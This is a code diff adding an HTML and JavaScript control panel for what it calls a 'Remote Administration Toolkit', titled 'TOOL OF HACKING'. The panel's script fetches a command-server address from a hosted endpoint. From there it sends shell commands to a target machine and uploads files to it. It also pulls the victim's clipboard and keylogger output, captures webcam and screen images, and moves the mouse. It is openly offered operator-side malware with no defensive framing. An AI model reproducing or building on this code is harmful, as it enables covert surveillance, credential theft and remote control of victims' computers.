@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>TOOL OF HACKING...</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <style>
+    #main-load {
+      display: block;
+    }
+          :root {
+            --dark-bg: #121212;
+            --darker-bg: #0a0a0a;
+            --accent-red: #ff4444;
+            --accent-green: #00ff88;
+            --text-muted: #aaaaaa;
+        }
+        
+        body {
+            background-color: var(--dark-bg);
+            color: white;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .terminal {
+            background-color: var(--darker-bg);
+            border: 1px solid #333;
+            border-radius: 5px;
+            min-height: 200px;
+            overflow-y: auto;
+            padding: 15px;
+        }
+        
+        .module {
+            background-color: var(--darker-bg);
+            border: 1px solid #333;
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .module-title {
+            color: var(--accent-red);
+            border-bottom: 1px solid #333;
+            padding-bottom: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .btn-danger {
+            background-color: var(--accent-red);
+            border: none;
+        }
+        
+        .btn-success {
+            background-color: var(--accent-green);
+            border: none;
+            color: #000;
+        }
+        
+        .blink {
+            animation: blink 1s step-end infinite;
+        }
+        
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+        
+        #keystrokeLog {
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+        }
+        
+        .status-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 5px;
+        }
+        
+        .online {
+            background-color: var(--accent-green);
+            box-shadow: 0 0 10px var(--accent-green);
+        }
+
+        #main-load{
+            background-color: var(--accent-red);
+            width:100%;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 30px;
+            color:white;
+            font-weight: 900;
+            letter-spacing: 5px;
+            font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+        }
+    main {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div id="main-load" class="container">Connecting To Server.....</div>
+
+  <main>
+   <div class="container py-4">
+        <div class="d-flex justify-content-between align-items-center mb-4">
+            <h1><i class="fas fa-skull"></i> Remote Administration Toolkit <span class="status-indicator online"></span></h1>
+            <div>
+                <span class="badge bg-danger">ACTIVE</span>
+                <span class="badge bg-success ms-2" id="connectionStatus">CONNECTED</span>
+            </div>
+        </div>
+
+        <div class="row">
+            
+            <div class="col-md-6">
+                <div class="module">
+                    <h3 class="module-title"><i class="fas fa-terminal"></i> Command Execution</h3>
+                    <div class="terminal" id="commandOutput">
+                        > System ready for commands...
+                    </div>
+                    <form id="commandForm" class="mt-3">
+                        <div class="input-group">
+                            <span class="input-group-text">$</span>
+                            <input type="text" class="form-control bg-dark text-white" id="commandInput" placeholder="Enter command...">
+                            <button class="btn btn-danger" type="submit">Execute</button>
+                        </div>
+                    </form>
+                </div>
+
+                <!-- File Upload Module -->
+                <div class="module">
+                    <h3 class="module-title"><i class="fas fa-file-upload"></i> File Upload</h3>
+                    <form id="uploadForm" enctype="multipart/form-data">
+                        <div class="mb-3">
+                            <input class="form-control bg-dark text-white" type="file" name="file" id="fileUpload">
+                        </div>
+                        <button type="submit" class="btn btn-danger w-100">Upload to Target</button>
+                    </form>
+                    <div id="uploadStatus" class="mt-2 text-muted"></div>
+                </div>
+
+                <!-- Clipboard Module -->
+                <div class="module">
+                    <h3 class="module-title"><i class="fas fa-clipboard"></i> Clipboard Monitor</h3>
+                    <div class="terminal" id="clipboardContent">
+                        No clipboard data available
+                    </div>
+                    <button id="refreshClipboard" class="btn btn-success mt-2 w-100">
+                        <i class="fas fa-sync-alt"></i> Refresh Clipboard
+                    </button>
+                </div>
+            </div>
+
+            <div class="col-md-6">
+               
+                <div class="module">
+                    <h3 class="module-title"><i class="fas fa-eye"></i> Surveillance</h3>
+                    <div class="d-flex gap-2 mb-3">
+                        <button id="captureWebcam" class="btn btn-danger flex-grow-1">
+                            <i class="fas fa-camera"></i> Capture Webcam
+                        </button>
+                        <button id="captureScreen" class="btn btn-danger flex-grow-1">
+                            <i class="fas fa-desktop"></i> Capture Screen
+                        </button>
+
+                         
+
+                      
+                    </div>
+                    <div class="text-center">
+                        <img id="surveillanceImage" src="" class="img-fluid rounded border border-danger" style="max-height: 300px; display: none;">
+                        <div id="noImage" class="text-muted">No image captured yet</div>
+                    </div>
+                </div>
+
+             
+                <div class="module">
+                    <h3 class="module-title"><i class="fas fa-keyboard"></i> Keylogger</h3>
+                    <div class="terminal" id="keystrokeLog">
+                        Keystroke log will appear here...
+                    </div>
+                    <div class="d-flex gap-2 mt-2">
+                        <button id="refreshKeystrokes" class="btn btn-success flex-grow-1">
+                            <i class="fas fa-sync-alt"></i> Refresh Log
+                        </button>
+                        <button id="clearKeystrokes" class="btn btn-danger flex-grow-1">
+                            <i class="fas fa-trash"></i> Clear Log
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Mouse Control Module -->
+                <div class="module">
+                    <h3 class="module-title"><i class="fas fa-mouse-pointer"></i> Mouse Control</h3>
+                    <div class="row g-2">
+                        <div class="col-6">
+                            <input type="number" class="form-control bg-dark text-white" id="mouseX" placeholder="X coordinate">
+                        </div>
+                        <div class="col-6">
+                            <input type="number" class="form-control bg-dark text-white" id="mouseY" placeholder="Y coordinate">
+                        </div>
+                    </div>
+                    <button id="moveMouse" class="btn btn-danger w-100 mt-2">
+                        <i class="fas fa-arrows-alt"></i> Move Mouse
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <input type="text" hidden  id="summa">
+  </main>
+
+  <script>
+  
+
+     
+let API_BASE = "";
+let isInitialized = false;
+
+
+const mainLoadElement = document.getElementById("main-load");
+const mainContentElement = document.querySelector("main");
+const initStatusElement = document.getElementById("init-status");
+
+async function initializeApp() {
+    try {
+        updateInitStatus("Fetching server configuration...");
+        
+        
+        const configResponse = await fetch("https://hack-sri.vercel.app/find");
+        if (!configResponse.ok) {
+            throw new Error(`Failed to fetch config: ${configResponse.status}`);
+        }
+
+        const configData = await configResponse.json();
+        if (!configData[0]?.url) {
+            throw new Error("Invalid server configuration");
+        }
+
+        API_BASE = configData[0].url;
+        updateInitStatus(`Connecting to ${API_BASE}...`);
+
+   
+        const pingResponse = await fetch(API_BASE, { method: 'HEAD' });
+        if (!pingResponse.ok) {
+            throw new Error(`Server connection failed: ${pingResponse.status}`);
+        }
+
+     
+        updateInitStatus("Initializing modules...");
+        await Promise.all([
+            updateClipboard(),
+            updateKeystrokes()
+        ]);
+
+        
+        isInitialized = true;
+        mainLoadElement.style.display = "none";
+        mainContentElement.style.display = "block";
+        updateConnectionStatus(true);
+    } catch (error) {
+        console.error("Initialization error:", error);
+        updateInitStatus(`Initialization failed: ${error.message}`);
+        showErrorAlert("Initialization Failed", error.message);
+    }
+}
+
+
+function updateInitStatus(message) {
+    if (initStatusElement) {
+        initStatusElement.textContent = message;
+    }
+}
+
+function updateConnectionStatus(isConnected) {
+    const statusElement = document.getElementById("connectionStatus");
+    if (statusElement) {
+        statusElement.textContent = isConnected ? "CONNECTED" : "DISCONNECTED";
+        statusElement.className = isConnected ? "badge bg-success ms-2" : "badge bg-danger ms-2";
+    }
+}
+
+function showErrorAlert(title, message) {
+    Swal.fire({
+        title: title,
+        text: message,
+        icon: 'error',
+        confirmButtonText: 'OK'
+    });
+}
+
+function setLoadingState(isLoading) {
+    const buttons = document.querySelectorAll("button");
+    buttons.forEach(btn => {
+        btn.disabled = isLoading;
+        if (isLoading) {
+            btn.classList.add("loading");
+        } else {
+            btn.classList.remove("loading");
+        }
+    });
+}
+
+async function executeCommand(command) {
+    if (!command || !isInitialized) return;
+
+    const outputDiv = document.getElementById("commandOutput");
+    outputDiv.innerHTML += `\n> ${command}\n<span class="text-muted">[Executing...]</span>`;
+    outputDiv.scrollTop = outputDiv.scrollHeight;
+
+    try {
+        setLoadingState(true);
+        const response = await fetch(`${API_BASE}/exu`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: `command=${encodeURIComponent(command)}`
+        });
+
+        if (!response.ok) {
+            throw new Error(`Command failed: ${response.status}`);
+        }
+
+        const data = await response.json();
+        const output = data.Output || data.Error || "No output received";
+        outputDiv.innerHTML += `\n${output}`;
+    } catch (error) {
+        console.error("Command error:", error);
+        outputDiv.innerHTML += `\n<span class="text-danger">[Error: ${error.message}]</span>`;
+    } finally {
+        setLoadingState(false);
+        outputDiv.scrollTop = outputDiv.scrollHeight;
+    }
+}
+
+async function uploadFile(file) {
+    if (!file || !isInitialized) return;
+
+    const statusDiv = document.getElementById("uploadStatus");
+    statusDiv.textContent = "Uploading...";
+    statusDiv.className = "mt-2 text-info";
+
+    try {
+        setLoadingState(true);
+        const formData = new FormData();
+        formData.append('file', file);
+
+        const response = await fetch(`${API_BASE}/upload`, {
+            method: 'POST',
+            body: formData
+        });
+
+        if (!response.ok) {
+            throw new Error(`Upload failed: ${response.status}`);
+        }
+
+        const data = await response.json();
+        statusDiv.textContent = data.SUCCESS || data.ERROR || "Upload completed";
+        statusDiv.className = data.SUCCESS ? "mt-2 text-success" : "mt-2 text-danger";
+    } catch (error) {
+        console.error("Upload error:", error);
+        statusDiv.textContent = `Upload failed: ${error.message}`;
+        statusDiv.className = "mt-2 text-danger";
+    } finally {
+        setLoadingState(false);
+    }
+}
+
+async function updateClipboard() {
+    if (!isInitialized) return;
+
+    const clipboardElement = document.getElementById("clipboardContent");
+    clipboardElement.innerHTML = '<span class="text-muted">[Refreshing...]</span>';
+
+    try {
+        const response = await fetch(`${API_BASE}/seeclip`);
+        if (!response.ok) {
+            throw new Error(`Failed to fetch clipboard: ${response.status}`);
+        }
+
+        const data = await response.json();
+        clipboardElement.textContent = data.ClipBoard || data.Error || "No clipboard data available";
+    } catch (error) {
+        console.error("Clipboard error:", error);
+        clipboardElement.innerHTML = `<span class="text-danger">Error: ${error.message}</span>`;
+    }
+}
+
+
+async function captureWebcam() {
+    if (!isInitialized) return;
+
+    try {
+        setLoadingState(true);
+        const response = await fetch(`${API_BASE}/capture`);
+        if (!response.ok) {
+            throw new Error(`Capture failed: ${response.status}`);
+        }
+
+        const img = document.getElementById("surveillanceImage");
+        img.src = `${API_BASE}/get-img?${Date.now()}`;
+        img.style.display = 'block';
+        document.getElementById("noImage").style.display = 'none';
+    } catch (error) {
+        console.error("Webcam error:", error);
+        showErrorAlert("Capture Failed", error.message);
+    } finally {
+        setLoadingState(false);
+    }
+}
+
+async function captureScreen() {
+    if (!isInitialized) return;
+
+    try {
+        setLoadingState(true);
+        const response = await fetch(`${API_BASE}/screen/hello1324`);
+        if (!response.ok) {
+            throw new Error(`Screen capture failed: ${response.status}`);
+        }
+
+        const data = await response.json();
+        if (data.URL) {
+            const img = document.getElementById("surveillanceImage");
+            img.src = data.URL;
+            img.style.display = 'block';
+            document.getElementById("noImage").style.display = 'none';
+        }
+    } catch (error) {
+        console.error("Screen capture error:", error);
+        showErrorAlert("Capture Failed", error.message);
+    } finally {
+        setLoadingState(false);
+    }
+}
+
+async function updateKeystrokes() {
+    if (!isInitialized) return;
+
+    const keystrokeElement = document.getElementById("keystrokeLog");
+    keystrokeElement.innerHTML = '<span class="text-muted">[Refreshing...]</span>';
+
+    try {
+        const response = await fetch(`${API_BASE}/ks`);
+        if (!response.ok) {
+            throw new Error(`Failed to fetch keystrokes: ${response.status}`);
+        }
+
+        const data = await response.json();
+        keystrokeElement.textContent = data.KEYSTROKES || "No keystrokes recorded";
+    } catch (error) {
+        console.error("Keystroke error:", error);
+        keystrokeElement.innerHTML = `<span class="text-danger">Error: ${error.message}</span>`;
+    }
+}
+
+async function clearKeystrokes() {
+    if (!isInitialized) return;
+
+    try {
+        setLoadingState(true);
+        const response = await fetch(`${API_BASE}/clear-key`);
+        if (!response.ok) {
+            throw new Error(`Clear failed: ${response.status}`);
+        }
+        await updateKeystrokes();
+    } catch (error) {
+        console.error("Clear keystrokes error:", error);
+        showErrorAlert("Clear Failed", error.message);
+    } finally {
+        setLoadingState(false);
+    }
+}
+
+
+async function moveMouse(x, y) {
+    if (!x || !y || !isInitialized) return;
+
+    try {
+        setLoadingState(true);
+        const response = await fetch(`${API_BASE}/mouse?x=${x}&y=${y}`);
+        if (!response.ok) {
+            throw new Error(`Mouse move failed: ${response.status}`);
+        }
+    } catch (error) {
+        console.error("Mouse error:", error);
+        showErrorAlert("Mouse Control Failed", error.message);
+    } finally {
+        setLoadingState(false);
+    }
+}
+
+
+function setupEventListeners() {
+    
+    document.getElementById('commandForm')?.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const command = document.getElementById('commandInput').value;
+        await executeCommand(command);
+        document.getElementById('commandInput').value = '';
+    });
+
+    
+    document.getElementById('uploadForm')?.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const fileInput = document.getElementById('fileUpload');
+        if (fileInput.files.length) {
+            await uploadFile(fileInput.files[0]);
+            fileInput.value = '';
+        }
+    });
+
+    // Clipboard
+    document.getElementById('refreshClipboard')?.addEventListener('click', updateClipboard);
+
+    // Surveillance
+    document.getElementById('captureWebcam')?.addEventListener('click', captureWebcam);
+    document.getElementById('captureScreen')?.addEventListener('click', captureScreen);
+
+    // Keylogger
+    document.getElementById('refreshKeystrokes')?.addEventListener('click', updateKeystrokes);
+    document.getElementById('clearKeystrokes')?.addEventListener('click', clearKeystrokes);
+
+    // Mouse control
+    document.getElementById('moveMouse')?.addEventListener('click', () => {
+        const x = document.getElementById('mouseX').value;
+        const y = document.getElementById('mouseY').value;
+        moveMouse(x, y);
+    });
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    setupEventListeners();
+    initializeApp();
+});
+
+   
+    
+  </script>
+</body>
+</html>
